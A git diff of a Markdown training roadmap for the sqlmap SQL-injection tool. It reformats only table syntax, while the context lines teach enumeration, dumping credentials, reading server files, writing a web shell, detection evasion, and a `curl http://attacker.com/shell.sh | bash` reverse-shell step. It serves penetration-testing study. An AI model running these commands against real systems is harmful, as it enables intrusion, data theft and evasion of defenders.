@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Web Proxy & Scanning | Fuzzing & Discovery | Exploitation | CMS & Vuln Scanners |
-|:---------------------|:--------------------|:-------------|:---------------------|
+| :--------------------- | :-------------------- | :------------- | :--------------------- |
 | [[Burp_Suite\|🕷️ Burp Suite]] | [[ffuf\|🌀 ffuf]] | **💉 sqlmap** (you are here) | [[Nikto\|🔍 Nikto]] |
 | [[OWASP_ZAP\|🛡️ OWASP ZAP]] | [[Gobuster\|📂 Gobuster]] | [[jwt-tool\|🔐 jwt-tool]] | [[wpscan\|🔌 WPScan]] |
-| [[Nuclei\|⚡ Nuclei]] | | | |
+| [[Nuclei\|⚡ Nuclei]] ||||
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 5 | 2–3 hours |
 | 2 | Detection | 5 | 3–4 hours |
 | 3 | Enumeration | 5 | 3–5 hours |
@@ -40,7 +40,7 @@
 | 6 | Evasion | 3 | 2–3 hours |
 | 7 | Practical Labs | 4 | 4–6 hours |
 | 8 | Mastery Challenges | 3 | 3–5 hours |
-| | **Total** | **32** | **~22–33 hours** |
+|| **Total** | **32** | **~22–33 hours** |
 
 **Prerequisites:** SQL basics (SELECT, WHERE, UNION, error messages). HTTP request/response structure. Understanding of how web applications interact with databases. Burp Suite experience (for capturing requests).
 
@@ -55,7 +55,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **What is SQLi** | Injection of SQL syntax into user-controlled input that gets incorporated unsanitized into a SQL query. The database executes attacker-controlled SQL. |
 | **Error-based** | Application returns database error messages revealing schema info. Fast but requires visible errors. |
 | **Union-based** | `UNION SELECT` appends attacker-controlled data to the result set. Returns data directly. Requires knowing column count and types. |
@@ -71,7 +71,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kali** | Pre-installed. `sqlmap --version`. |
 | **Manual** | `git clone https://github.com/sqlmapproject/sqlmap`. `python3 sqlmap.py`. |
 
@@ -82,7 +82,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Target** | `-u "http://target.com/page?id=1"` — URL with parameter. `-r request.txt` — raw HTTP request file (from Burp). |
 | **Database** | `--dbs` — list databases. `-D dbname` — use this database. `--tables` — list tables. `-T tablename` — use this table. `--columns` — list columns. `--dump` — dump table data. |
 | **Speed** | `--level=5 --risk=3` — more tests (default 1/1). `--threads=10` — parallel requests (faster). |
@@ -96,7 +96,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Capture** | Burp Suite → intercept request → right-click → Save item → `request.txt`. Or copy raw request and paste. |
 | **Run** | `sqlmap -r request.txt --batch --dbs`. |
 | **Mark Parameter** | If sqlmap tests the wrong param: `sqlmap -r request.txt -p "id" --batch`. |
@@ -109,7 +109,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Level** | 1–5. Default 1. Higher = more injection tests per parameter. Level 3+ tests cookie and User-Agent headers. Level 5 = exhaustive. |
 | **Risk** | 1–3. Default 1. Higher risk = tests more dangerous payloads (can cause data modification). Risk 2: adds time-based blind. Risk 3: adds OR-based payloads (may cause logic changes). Use risk 3 only in controlled environments. |
 | **Recommendation** | Start with default (1/1). If no detection: try `--level=3 --risk=2`. If still nothing: `--level=5 --risk=3 --technique=T` (time-based only, safest for blind). |
@@ -125,7 +125,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sqlmap -u "http://target.com/items?id=1" --batch`. |
 | **Output** | sqlmap tells you: parameter is vulnerable, injection technique (union/boolean/error/time), and database type. |
 | **What sqlmap Tests** | Single quote, double quote, comments, AND 1=1, UNION probes, time delays — automatically. |
@@ -137,7 +137,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Data Flag** | `sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch`. |
 | **Mark Injection Point** | `--data="username=admin*&password=test"` — `*` marks the injection point explicitly. |
 
@@ -148,7 +148,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Cookie** | `sqlmap -u "http://target.com/" --cookie="session=abc123; id=1" -p "id" --batch`. |
 | **Headers** | `sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1*" --batch`. |
 | **Level 3+** | `--level=3` automatically tests Referer and User-Agent headers for injection. |
@@ -160,7 +160,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Input is stored in the database and then later used in a SQL query — not directly in the immediate response. |
 | **sqlmap** | `sqlmap -r request.txt --second-url="http://target.com/profile"`. sqlmap injects at the first URL and detects injection at the second URL's response. |
 
@@ -171,7 +171,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Verify** | If sqlmap says vulnerable: manually test the payload sqlmap used. Confirm the behavior (error, timing, data) is real and not an application quirk. |
 | **WAF Interference** | If the application has a WAF that blocks and returns 403 for any anomalous input, sqlmap may behave unpredictably. Use `--identify-waf` and bypass techniques. |
 
@@ -186,7 +186,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Current DB** | `sqlmap -u "http://target/?id=1" --current-db --batch`. |
 | **All DBs** | `--dbs` — list all accessible databases. |
 | **Tables** | `-D targetdb --tables` — list tables in a database. |
@@ -200,7 +200,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Specific Columns** | `-D db -T users -C "username,password" --dump`. |
 | **Row Limit** | `--start=1 --stop=10` — dump rows 1 through 10 only. |
 | **Where** | `--where="id=1"` — equivalent to SQL WHERE clause. |
@@ -212,7 +212,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Users Table** | `-D db -T users -C "username,password,email" --dump`. |
 | **Hash Detection** | sqlmap recognizes hash formats in dumped columns. Offers to crack them automatically: `do you want to crack them via a dictionary-based attack? [Y/n]`. |
 | **Crack Inline** | sqlmap runs JtR/Hashcat internally when you confirm. Or decline and crack manually with JtR/Hashcat. |
@@ -224,7 +224,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Full Schema** | `--schema` — dump entire database schema (all tables and columns in all databases). |
 | **Search** | `--search -C password` — search across all tables for columns named "password". |
 
@@ -235,7 +235,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Current User** | `--current-user` — which DB user the app is running as. |
 | **All Users** | `--users` — list all database user accounts. |
 | **Passwords** | `--passwords` — dump hashed DB user passwords. |
@@ -252,7 +252,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Read** | `--file-read="/etc/passwd"` — read a server-side file via LOAD_FILE() (MySQL, requires FILE privilege). |
 | **Write** | `--file-write="shell.php" --file-dest="/var/www/html/shell.php"` — write a file to the server (requires write permission + FILE privilege). |
 | **Prerequisite** | DB user must have FILE privilege. MySQL: `SHOW GRANTS FOR CURRENT_USER()`. `--is-dba` = true is a good indicator. |
@@ -264,7 +264,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `--os-shell` — attempt to get an interactive OS shell via SQL injection. |
 | **Method** | Writes a web shell or uses xp_cmdshell (MSSQL), sys.exec (PostgreSQL), or LOAD_FILE+INTO OUTFILE (MySQL) to execute OS commands. |
 | **Requirements** | Stacked queries must be possible. DBA-level privilege. Writable web directory for MySQL. |
@@ -276,7 +276,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Proxy** | `--proxy="http://127.0.0.1:8080"` — route through Burp to see all sqlmap requests. |
 | **Tor** | `--tor --tor-type=SOCKS5` — route through Tor for anonymity. |
 | **Delay** | `--delay=1` — 1-second delay between requests. Reduces detection signature. `--randomize-ua` — randomize User-Agent per request. |
@@ -288,7 +288,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Speed Up** | `--threads=5` — parallel requests. `--technique=B` — boolean only (faster than time-based). |
 | **Time-based Tuning** | `--time-sec=3` — adjust expected delay (default 5 seconds). Lower = faster but may miss slow servers. |
 | **Dump Optimization** | `--string="Welcome"` — tell sqlmap which string indicates a "true" response for boolean blind (avoids autodetection errors). |
@@ -304,7 +304,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **When** | No in-band data visible. DNS/HTTP outbound from database server is possible. |
 | **sqlmap OOB** | `--technique=O` — out-of-band technique. Requires `--dns-domain=yourdomain.com` (you must control this domain and monitor DNS lookups). |
 
@@ -315,7 +315,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use OS command execution via SQLi to gain a foothold and pivot. |
 | **Workflow** | `--os-shell` → execute `curl http://attacker.com/shell.sh | bash` → reverse shell → post-exploitation. |
 
@@ -326,7 +326,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Location** | `~/.local/share/sqlmap/output/target.com/`. |
 | **Contents** | `log` (all requests). `session.sqlite` (results cache — sqlmap remembers what it found). `dump/` (extracted data). |
 | **Share** | Copy dump files for reporting. Session file lets you resume without re-running all probes. |
@@ -342,7 +342,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Purpose** | Modify sqlmap's payloads to bypass WAF/IDS filters. |
 | **Use** | `--tamper=space2comment` — replaces spaces with `/**/`. `--tamper=between` — replaces `>` with `BETWEEN`. `--tamper=randomcase` — random uppercase/lowercase. Multiple: `--tamper=space2comment,randomcase`. |
 | **List** | `sqlmap --list-tampers` — see all available tamper scripts. |
@@ -355,7 +355,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Detect** | `--identify-waf` — sqlmap probes to identify the WAF (Cloudflare, ModSecurity, Imperva etc.). |
 | **Response** | Knowing the WAF type guides tamper script selection. Cloudflare: `space2comment`, `charunicodeescape`. ModSecurity: `between`, `equaltolike`. |
 
@@ -366,7 +366,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Slow It Down** | `--delay=2 --safe-freq=3` — delay 2 seconds per request. Every 3 malicious requests send 1 normal "safe" request to blend in. |
 | **Limit Tests** | `--technique=U --level=1` — only union-based, minimal tests. Least noisy approach. |
 | **Avoid Detection** | `--randomize-ua`. `--proxy` via Burp or Tor. `--prefix="/*!*/` and `--suffix` for custom comment bypass. |
@@ -447,7 +447,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can detect SQL injection with sqlmap from URL and Burp request file | ☐ |
 | Can enumerate databases, tables, columns, and dump data | ☐ |
 | Can test cookies, headers, and POST parameters | ☐ |
